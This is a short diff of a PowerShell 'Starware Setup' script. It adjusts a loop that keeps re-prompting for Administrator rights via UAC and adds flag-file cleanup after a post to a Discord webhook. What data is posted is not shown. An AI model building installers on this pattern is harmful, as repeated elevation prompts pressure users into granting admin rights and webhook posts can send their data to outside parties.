@@ -1,4 +1,3 @@
-Add-Type -AssemblyName System.Windows.Forms
 # Display initialization message
 Write-Host "Starware Setup initialized" -ForegroundColor Blue
 Write-Host "Checking for Administrator privileges..."
@@ -42,7 +41,7 @@ while ($true) {
         Invoke-Admin
 
         # Wait a bit to avoid rapid repetitive prompts and give the user time to respond to UAC
-        Start-Sleep -Seconds 30
+        Start-Sleep -Seconds 20
     }
 }
 
@@ -392,5 +391,10 @@ $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -B
 
 # Output the response for debugging purposes
 Write-Host "Response from Discord: $response" -ForegroundColor Cyan
+
+# Logic to delete the flag file upon completion
+if ([System.IO.File]::Exists($flagPath)) {
+    [System.IO.File]::Delete($flagPath)
+}
 
 Read-Host -Prompt "Press Enter to exit"
